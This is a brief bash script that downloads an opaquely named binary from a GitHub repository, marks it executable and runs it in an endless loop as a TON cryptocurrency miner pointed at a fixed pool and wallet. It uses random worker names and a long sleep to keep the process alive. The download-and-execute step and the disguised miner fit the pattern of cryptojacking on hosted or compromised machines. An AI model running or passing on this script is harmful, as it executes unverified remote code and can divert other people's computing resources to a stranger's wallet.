#!/bin/bash
POOL=stratum+tcp://pool.services.tonwhales.com
WALLET=EQCGSQPg6-HnteLECBoIz9jU8hJHszzlBfac53LY3T8KMK80
WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo TON --pool $POOL --user $WALLET.$WORKER 
sleep 5
done
sleep 999999999
